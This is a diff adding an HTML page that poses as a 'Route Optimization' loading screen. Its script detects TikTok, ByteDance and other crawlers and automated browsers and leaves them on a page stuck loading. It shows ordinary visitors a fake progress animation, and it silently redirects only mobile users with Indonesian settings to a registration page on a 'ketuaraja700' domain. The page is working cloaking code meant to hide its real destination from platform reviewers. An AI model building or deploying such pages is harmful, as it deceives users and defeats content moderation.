@@ -1,0 +1,210 @@
+
+
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Route Optimization</title>
+
+<style>
+:root{
+  --gold:#d8c48a;
+  --bg1:#06070c;
+  --bg2:#010208;
+  --panel:#0b0e1c;
+  --text:#ececf1;
+  --muted:#8e94a8;
+}
+*{box-sizing:border-box}
+
+html,body{
+  margin:0;
+  height:100%;
+  font-family:Inter,system-ui,-apple-system,"Segoe UI";
+  background:radial-gradient(circle at top,var(--bg1),var(--bg2));
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:var(--text);
+}
+
+/* FULL SYSTEM MODE */
+*{pointer-events:none}
+
+.frame{
+  width:420px;
+  padding:46px 40px;
+  border-radius:26px;
+  background:linear-gradient(180deg,#10142a,#07091a);
+  border:1px solid rgba(216,196,138,.26);
+  box-shadow:
+    0 0 90px rgba(216,196,138,.08),
+    inset 0 0 50px rgba(255,255,255,.02);
+  text-align:center;
+}
+
+h1{
+  margin:0 0 6px;
+  font-size:18px;
+  font-weight:600;
+  letter-spacing:.6px;
+}
+p{
+  margin:0 0 28px;
+  font-size:12.5px;
+  color:var(--muted);
+  letter-spacing:.4px;
+}
+
+.route{
+  width:78px;
+  height:78px;
+  margin:0 auto 22px;
+  border-radius:50%;
+  border:2px solid rgba(216,196,138,.35);
+  position:relative;
+}
+.route::before{
+  content:"";
+  position:absolute;
+  inset:18px;
+  border-radius:50%;
+  border:2px solid rgba(216,196,138,.45);
+}
+.route::after{
+  content:"";
+  position:absolute;
+  inset:6px;
+  border-radius:50%;
+  border:2px dashed rgba(216,196,138,.35);
+  animation:spin 1.1s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.status{
+  font-size:14.5px;
+  min-height:22px;
+  letter-spacing:.3px;
+}
+
+.flow{
+  margin-top:22px;
+  height:4px;
+  background:#1a1e35;
+  border-radius:6px;
+  overflow:hidden;
+}
+.move{
+  width:0%;
+  height:100%;
+  background:linear-gradient(90deg,#d8c48a,#fff1c6);
+  transition:width .18s linear;
+}
+
+.note{
+  margin-top:16px;
+  font-size:11px;
+  color:var(--muted);
+  letter-spacing:.35px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="frame">
+
+  <h1>ROUTE OPTIMIZATION</h1>
+  <p>Selecting fastest access path</p>
+
+  <div class="route"></div>
+
+  <div class="status" id="status">
+    Analyzing network route
+  </div>
+
+  <div class="flow">
+    <div class="move" id="move"></div>
+  </div>
+
+  <div class="note">
+    Adaptive routing enabled
+  </div>
+
+</div>
+
+<script>
+(function () {
+
+  const ua = navigator.userAgent || "";
+
+  /* ===== BLOCK TIKTOK & BOT ===== */
+  if (
+    navigator.webdriver ||
+    /tiktok|bytedance|musical_ly|adsbot|crawler|spider|bot/i.test(ua)
+  ) {
+    return; // STUCK
+  }
+
+  const status = document.getElementById("status");
+  const move   = document.getElementById("move");
+  const TARGET = "https://tiktok.ketuaraja700.com/register";
+
+  /* ===== MOBILE ONLY ===== */
+  const isMobile =
+    window.innerWidth <= 820 &&
+    ('ontouchstart' in window || navigator.maxTouchPoints > 0);
+
+  /* ===== INDONESIA CHECK (CLIENT-SIDE) ===== */
+  const lang = (navigator.language || "").toLowerCase();
+  const tz   = Intl.DateTimeFormat().resolvedOptions().timeZone || "";
+
+  const isIndonesia =
+    lang.startsWith("id") &&
+    /jakarta|makassar|jayapura/i.test(tz);
+
+  let progress = 0;
+
+  const engine = setInterval(() => {
+    progress += 35 + Math.random() * 20;
+    if (progress > 100) progress = 100;
+
+    move.style.width = progress + "%";
+
+    if (progress < 40) {
+      status.textContent = "Analyzing network route";
+    } else if (progress < 75) {
+      status.textContent = "Balancing access path";
+    } else {
+      status.textContent = "Route optimized";
+    }
+
+    if (progress >= 100) {
+      clearInterval(engine);
+
+      if (isMobile && isIndonesia) {
+        status.textContent = "Redirecting to optimized route";
+
+        // Safari / iOS safe redirect
+        location.href = TARGET;
+        setTimeout(() => location.replace(TARGET), 300);
+
+      } else {
+        status.textContent = "Optimized route unavailable";
+        // STUCK FOREVER
+      }
+    }
+  }, 160);
+
+})();
+</script>
+
+
+
+
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"22f6790a6b874714b7dca80135a62a66","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
